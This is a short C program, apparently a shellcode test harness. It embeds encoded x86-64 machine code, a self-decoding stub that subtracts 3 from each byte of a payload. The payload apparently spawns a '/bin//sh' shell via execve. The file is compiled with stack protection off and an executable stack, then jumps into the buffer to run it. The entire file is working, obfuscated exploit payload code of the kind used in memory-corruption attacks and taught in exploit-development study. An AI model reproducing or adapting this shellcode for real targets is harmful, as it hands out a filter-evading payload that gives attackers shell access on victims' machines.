#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack

unsigned char code[] = \
"\xeb\x1f\x5e\x48\x31\xd2\x48\x31\xc9\xb1\x20\x48\x8d\x16\x8a\x1a\xfe\xcb\xfe\xcb\xfe\xcb\x74\xfc\x88\x1a\x48\xff\xc2\xe2\xef\xeb\x05\xe8\xdc\xff\xff\xff\x4b\x34\xc3\x53\x4b\xbe\x32\x65\x6c\x71\x32\x32\x76\x6b\x56\x4b\x8c\xea\x53\x4b\x8c\xe5\x5a\x4b\x8c\xe9\x4b\x86\xc3\x3e\x12\x08";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
